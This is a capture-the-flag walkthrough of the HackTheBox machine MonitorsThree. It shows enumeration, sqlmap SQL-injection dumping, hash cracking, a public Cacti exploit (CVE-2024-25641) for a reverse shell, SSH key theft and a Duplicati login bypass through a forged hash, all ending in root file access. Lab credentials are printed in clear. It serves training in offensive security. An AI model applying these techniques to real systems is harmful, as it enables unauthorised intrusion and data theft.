*By Praveen Kumar Sharma*

![[Pasted image 20241117004948.png]]

<hr>

For me IP of the machine is : **10.10.11.30**
Lets try pinging it 

![[Pasted image 20241115180425.png]]

Now lets do port scanning 

<hr>

### Port Scanning 

#### All Port Scan

```bash
rustscan -a 10.10.11.30 --ulimit 5000
```

![[Pasted image 20241115180718.png]]

>[!Info] Open Ports
>PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Now lets take deeper look on these
#### Aggressive Scan

```bash
nmap -sC -sV -A -T5 -n -Pn -p 22,80 10.10.11.30 -o aggressiveScan.txt
```

![[Pasted image 20241115180824.png]]

>[!Info] Aggressive Scan
>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Now lets add monitorsthree.htb to /etc/hosts

![[Pasted image 20241115181024.png]]

Lets do directory fuzzing and VHOST Enumeration next 

<hr>

### Directory Fuzzing and VHOST Enumeration

#### Directory Fuzzing 

```bash
feroxbuster -u http://monitorsthree.htb -w /usr/share/wordlists/dirb/common.txt -t 200 -r
```

![[Pasted image 20241115181220.png]]

>[!Info] Directories
>200      GET        1l      235w    12063c http://monitorsthree.htb/images/review.svg
200      GET       19l       62w     3695c http://monitorsthree.htb/images/services/04.png
200      GET        6l       34w     2166c http://monitorsthree.htb/images/services/02.png
200      GET       11l       15w      188c http://monitorsthree.htb/css/plugins.css
200      GET       38l      117w     2813c http://monitorsthree.htb/js/plugins.js
200      GET        5l       30w     1616c http://monitorsthree.htb/images/services/01.png
200      GET       24l       99w      770c http://monitorsthree.htb/js/smoothscroll.js
200      GET       71l      130w     1872c http://monitorsthree.htb/js/custom.js
200      GET        9l       43w     3028c http://monitorsthree.htb/images/services/03.png
200      GET       96l      239w     4252c http://monitorsthree.htb/login.php
200      GET        1l      393w    15974c http://monitorsthree.htb/images/about-us.svg
200      GET      935l     1752w    15174c http://monitorsthree.htb/css/style.css
200      GET      109l      619w    13655c http://monitorsthree.htb/images/service.svg
200      GET        1l      359w    22207c http://monitorsthree.htb/images/banner.svg
200      GET        5l      369w    21003c http://monitorsthree.htb/js/popper.min.js
403      GET        7l       10w      162c http://monitorsthree.htb/admin/
200      GET      175l     1248w    89112c http://monitorsthree.htb/admin/assets/images/logo.png
200      GET        4l     1293w    86709c http://monitorsthree.htb/js/jquery-min.js
403      GET        7l       10w      162c http://monitorsthree.htb/admin/assets/images/
403      GET        7l       10w      162c http://monitorsthree.htb/css/
200      GET        7l      277w    44342c http://monitorsthree.htb/js/owl.carousel.min.js
403      GET        7l       10w      162c http://monitorsthree.htb/images/
200      GET        7l      683w    60010c http://monitorsthree.htb/js/bootstrap.min.js
200      GET       87l     1326w   157954c http://monitorsthree.htb/admin/assets/images/logo.ico
200      GET      338l      982w    13560c http://monitorsthree.htb/

Lets do VHOST enumeration as well

```bash
ffuf -u http://monitorsthree.htb -H 'Host: FUZZ.monitorsthree.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -ac
```

![[Pasted image 20241115181435.png]]

Lets add cacti.monitorsthree.htb to our host or /etc/hosts as well

![[Pasted image 20241115181540.png]]

Now lets see this web application now 

<hr>

### Web Application 

Default page

![[Pasted image 20241116020230.png]]

Found this login page here lets see this 

![[Pasted image 20241116020318.png]]

Didnt find a vulnerability here but there is this forgot password page 

![[Pasted image 20241116020418.png]]

So here found a SQL injection i think cuz it took a bit longer when i tested it with it

Saved a request and tested with URL as well 

```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php' --forms --dbs --batch --level 5 --risk 3 --threads 10
```

![[Pasted image 20241116020536.png]]

This was very slow so got a request then ran that to get the tables 

```bash
sqlmap -r ~/Documents/Notes/Hands-on-Hacking/HacktheBox/MonitorsThree/test.sql --batch -D monitorsthree_db --tables --threads 10 --level 5 --risk 3
```

![[Pasted image 20241116020645.png]]

Lets get the username and password out of users table here
Took almost 4hr but dumped it finally

```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php' --forms -D monitorsthree_db -T users -C username,password --dump --batch --level 5 --risk 3 --threads 10
```

![[Pasted image 20241116020909.png]]

Lets crack this using crackstation

![[Pasted image 20241116020945.png]]

>[!Warning] Login Creds
>Username : admin
>Password : greencacti2001

Now tested this here but didnt work but we do have that subdomain to look at 

![[Pasted image 20241116021121.png]]

I know we see the version here but lets test the creds first 

![[Pasted image 20241116021214.png]]

Now lets find an exploit 

<hr>

### Gaining Access

Found an exploit : https://github.com/5ma1l/CVE-2024-25641

![[Pasted image 20241116021334.png]]

Now lets run it 
But first a listener 

![[Pasted image 20241116021447.png]]

Change your IP and port in the php/monkey.php

![[Pasted image 20241116021827.png]]

Now lets run the exploit

```python
python3 exploit.py http://cacti.monitorsthree.htb/cacti/ admin greencacti2001
```

![[Pasted image 20241116021550.png]]

And we get our shell here 

![[Pasted image 20241116021846.png]]

Now, lets upgrade this

![[Pasted image 20241116022001.png]]

<hr>

### Lateral PrivEsc

Found a config file here 

![[Pasted image 20241116022149.png]]

Lets cat this our 

![[Pasted image 20241116022235.png]]

Now lets login in mysql

![[Pasted image 20241116022330.png]]

Now lets see the databases here 

![[Pasted image 20241116022428.png]]

Lets see the tables in cacti database

![[Pasted image 20241116022519.png]]

Now lets describe this table here 

![[Pasted image 20241116022604.png]]

Lets select username and password here 

![[Pasted image 20241116022835.png]]

Lets save marcus's password hash here 

![[Pasted image 20241116022934.png]]

Now lets crack it with hashcat like this 

```python
hashcat -a 0 -m 3200 hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 
```

![[Pasted image 20241116023044.png]]

>[!Warning] User Creds
>Username : marcus 
>Password : 12345678910

Lets switch user to marcus, I tested it with ssh and it doesnt work 

![[Pasted image 20241116023239.png]]

Now here is the id_rsa of marcus 

![[Pasted image 20241116023339.png]]

Lets cat this out 

![[Pasted image 20241116023426.png]]

Now lets copy this over to us and change permission 

![[Pasted image 20241116023533.png]]

Now lets ssh in 

![[Pasted image 20241116023612.png]]

And here is your user.txt

![[Pasted image 20241116023641.png]]

<hr>

### Vertical PrivEsc

So found some port listening here 

![[Pasted image 20241116235848.png]]

And im gonna save u time to say that port 8200 is only the important one here 

So lets port forward it to us

```python
ssh -L 8200:localhost:8200 -i id_rsa marcus@monitorsthree.htb
```

![[Pasted image 20241117000050.png]]

Lets see this page now 

![[Pasted image 20241117000255.png]]

So i searched for the file relating to this on the box 

![[Pasted image 20241117000424.png]]

Ok this should be helpful so got it on mine 

![[Pasted image 20241117000705.png]]

Now, lets dump it using sqlite3 and save it to file 

```python
sqlite3 Duplicati-server.sqlite .dump > duplicati.dump
```

![[Pasted image 20241117000801.png]]

Now lets see file now 

![[Pasted image 20241117000839.png]]

Got this passphrase here so i should really be looking for an exploit here 

Found this : https://github.com/duplicati/duplicati/issues/5197

![[Pasted image 20241117000939.png]]

Now lets run this exploit as specified just follow along 

First we need to convert our server-passphrase to a salted password do it like so 

![[Pasted image 20241117001048.png]]

Now lets put any password in duplicati and intercept it with burp

![[Pasted image 20241117001508.png]]

Intercept the response to this request for the nonce 

![[Pasted image 20241117001649.png]]

Now open up the console on the duplicati page 

```js
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NONCE') + 'SALTED_PASSWD')).toString(CryptoJS.enc.Base64);
```

then just 

```js
console.log(noncedpwd);
```

![[Pasted image 20241117002004.png]]

Now forward that response request then in the next POST request put this in as password and URL encode this 

![[Pasted image 20241117002106.png]]

Now forward this and u should be logged in (Pro Tip : Drop the intercept after forwarding this for less interruptions)

![[Pasted image 20241117002238.png]]

And now just follow along to get root.txt
Add a backup here 

![[Pasted image 20241117002331.png]]

and put in the destination

![[Pasted image 20241117002355.png]]

Select the source data 

![[Pasted image 20241117002423.png]]

disable the automatic backup

![[Pasted image 20241117002436.png]]

Now just hit save here 

![[Pasted image 20241117002447.png]]

on the home page if u reload u should see the new backup

![[Pasted image 20241117002458.png]]

Just hit run now once

![[Pasted image 20241117002507.png]]

Now open up restore file after clicking the down arrow next to root_flag
Select the file here

![[Pasted image 20241117002526.png]]

Put in the folder path as such and make sure to enable restore read/write permissions

![[Pasted image 20241117002555.png]]

And if u see this u have done everything correctly

![[Pasted image 20241117002604.png]]

Now on the system and in our home directory 

![[Pasted image 20241117002947.png]]

Go into this directory 

![[Pasted image 20241117003026.png]]

And here is your root.txt 

![[Pasted image 20241117003103.png]]

Thanks for reading :)


